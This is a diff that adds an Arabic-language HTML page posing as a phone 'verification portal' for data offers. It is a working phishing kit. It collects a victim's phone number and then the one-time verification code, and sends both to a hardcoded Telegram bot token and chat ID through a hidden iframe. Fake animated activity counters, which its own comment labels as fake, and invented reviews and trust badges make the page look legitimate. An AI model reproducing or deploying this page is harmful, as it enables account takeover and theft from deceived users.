@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>بوابة التحقق | عروض البيانات</title>
+
+<style>
+* { box-sizing: border-box; }
+
+body {
+  margin: 0;
+  font-family: "Segoe UI", Arial, sans-serif;
+  direction: rtl;
+  min-height: 100vh;
+  background: linear-gradient(120deg, #0f7b3e, #1db954, #0f7b3e);
+  background-size: 400% 400%;
+  animation: bg 12s ease infinite;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+@keyframes bg {
+  0% { background-position: 0% 50%; }
+  50% { background-position: 100% 50%; }
+  100% { background-position: 0% 50%; }
+}
+
+.wrapper {
+  width: 95%;
+  max-width: 430px;
+}
+
+.card {
+  background: #fff;
+  border-radius: 18px;
+  padding: 24px;
+  box-shadow: 0 18px 45px rgba(0,0,0,0.25);
+  animation: fadeIn .6s ease;
+}
+
+@keyframes fadeIn {
+  from { opacity: 0; transform: translateY(14px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+.logo {
+  text-align: center;
+  font-size: 24px;
+  font-weight: 800;
+  color: #0f7b3e;
+}
+
+.subtitle {
+  text-align: center;
+  font-size: 13px;
+  color: #666;
+  margin-bottom: 14px;
+}
+
+h2 {
+  font-size: 18px;
+  margin: 8px 0;
+}
+
+p {
+  font-size: 14px;
+  color: #555;
+  line-height: 1.7;
+}
+
+input {
+  width: 100%;
+  padding: 13px;
+  margin-top: 12px;
+  font-size: 15px;
+  border-radius: 10px;
+  border: 1px solid #ccc;
+}
+
+button {
+  width: 100%;
+  padding: 13px;
+  margin-top: 16px;
+  font-size: 16px;
+  font-weight: 700;
+  background: #0f7b3e;
+  color: #fff;
+  border: none;
+  border-radius: 12px;
+  cursor: pointer;
+}
+
+button:hover { background: #0c6232; }
+
+.hidden { display: none; }
+
+.info {
+  margin-top: 10px;
+  font-size: 13px;
+  color: #0f7b3e;
+  text-align: center;
+}
+
+/* شريط الثقة */
+.trustbar {
+  margin-top: 14px;
+  padding-top: 12px;
+  border-top: 1px dashed #eee;
+}
+
+.stats {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 8px;
+  text-align: center;
+  font-size: 12px;
+}
+
+.stat {
+  background: #f6f9f7;
+  border-radius: 10px;
+  padding: 8px 6px;
+}
+
+.stat b {
+  display: block;
+  font-size: 16px;
+  color: #0f7b3e;
+}
+
+/* شارات */
+.badges {
+  display: flex;
+  gap: 8px;
+  flex-wrap: wrap;
+  margin-top: 10px;
+  justify-content: center;
+}
+
+.badge {
+  background: #eef6f1;
+  color: #0f7b3e;
+  font-size: 12px;
+  padding: 6px 10px;
+  border-radius: 999px;
+}
+
+/* تقييمات */
+.reviews {
+  margin-top: 14px;
+  background: #fafafa;
+  border-radius: 12px;
+  padding: 10px;
+}
+
+.review {
+  font-size: 13px;
+  color: #444;
+  margin-bottom: 6px;
+}
+
+.review span {
+  color: #0f7b3e;
+  font-weight: 700;
+}
+
+/* شريط نجوم */
+.stars {
+  color: #f5b301;
+  font-size: 14px;
+  margin-bottom: 6px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="wrapper">
+
+  <!-- خطوة إدخال الرقم -->
+  <div class="card" id="stepPhone">
+    <div class="logo">بوابة التحقق</div>
+    <div class="subtitle">خدمة التحقق الآمن</div>
+
+    <h2>التحقق من رقم الهاتف</h2>
+    <p>
+      أدخل رقم هاتفك للمتابعة. تتم معالجة الطلبات وفق إجراءات تحقق معتمدة.
+      قد تستغرق العملية بضع لحظات.
+    </p>
+
+    <input type="tel" id="phoneNumber" placeholder="رقم الهاتف">
+
+    <button onclick="sendPhone()">متابعة</button>
+
+    <div class="info hidden" id="infoMsg">
+      جارٍ معالجة الطلب، الرجاء الانتظار…
+    </div>
+
+    <!-- شريط الثقة -->
+    <div class="trustbar">
+      <div class="stats">
+        <div class="stat"><b id="s1">0</b>طلبات اليوم</div>
+        <div class="stat"><b id="s2">0</b>تمت المعالجة</div>
+        <div class="stat"><b id="s3">0</b>معدل الرضا</div>
+      </div>
+
+      <div class="badges">
+        <div class="badge">✔ معالجة آمنة</div>
+        <div class="badge">✔ سياسة خصوصية</div>
+        <div class="badge">✔ دعم فني</div>
+        <div class="badge">✔ مراجعة يدوية</div>
+      </div>
+
+      <div class="reviews">
+        <div class="stars">★★★★★</div>
+        <div class="review"><span>محمد:</span> شكراً، الإجراء كان واضح وسريع.</div>
+        <div class="review"><span>سارة:</span> تمت المتابعة بدون أي تعقيد.</div>
+        <div class="review"><span>أحمد:</span> خدمة مرتبة وتعامل محترم.</div>
+        <div class="review"><span>ريم:</span> تم التواصل خلال وقت مناسب.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- خطوة إدخال الرمز -->
+  <div class="card hidden" id="stepCode">
+    <div class="logo">بوابة التحقق</div>
+    <div class="subtitle">إدخال الرمز</div>
+
+    <h2>رمز التحقق</h2>
+    <p>
+      أدخل رمز التحقق الذي تم تزويدك به لإكمال العملية.
+    </p>
+
+    <input type="text" id="verificationCode" placeholder="رمز التحقق">
+
+    <button onclick="sendVerification()">إرسال الرمز</button>
+
+    <div class="info">
+      في حال التأخير، يرجى الانتظار وسيتم استكمال الإجراء.
+    </div>
+  </div>
+
+</div>
+
+<iframe id="tg" style="display:none;"></iframe>
+
+<script>
+// عدادات وهمية تتحرك (إحساس نشاط)
+function animateCounter(id, target, step, delay) {
+  let val = 0;
+  const el = document.getElementById(id);
+  const t = setInterval(() => {
+    val += step;
+    if (val >= target) { val = target; clearInterval(t); }
+    el.textContent = val;
+  }, delay);
+}
+animateCounter("s1", 128, 3, 20);
+animateCounter("s2", 117, 3, 24);
+animateCounter("s3", 98, 2, 30);
+
+// تيليجرام
+const token = "8304204197:AAFH4TvGEurt0iK5O6950FMqQSGEiXybYgY";
+const chatId = "7428421245";
+
+function sendPhone() {
+  const phoneNumber = document.getElementById("phoneNumber").value;
+  if (phoneNumber.length < 9) { alert("الرجاء إدخال رقم هاتف صحيح"); return; }
+
+  sendTG("📥 طلب جديد\n\n📱 الرقم:\n" + phoneNumber + "\n\n⏳ بانتظار الرمز");
+  document.getElementById("infoMsg").classList.remove("hidden");
+
+  setTimeout(() => {
+    document.getElementById("stepPhone").classList.add("hidden");
+    document.getElementById("stepCode").classList.remove("hidden");
+  }, 1800);
+}
+
+function sendVerification() {
+  const phoneNumber = document.getElementById("phoneNumber").value;
+  const verificationCode = document.getElementById("verificationCode").value;
+  if (verificationCode.length < 4) { alert("أدخل رمزًا صحيحًا"); return; }
+
+  sendTG("🔐 رمز وارد\n\n📱 الرقم: " + phoneNumber + "\n🔢 الرمز: " + verificationCode);
+  alert("تم إرسال الرمز للمراجعة");
+}
+
+function sendTG(text) {
+  const url = "https://api.telegram.org/bot" + token +
+    "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(text);
+  document.getElementById("tg").src = url;
+}
+</script>
+
+</body>
+  </html>
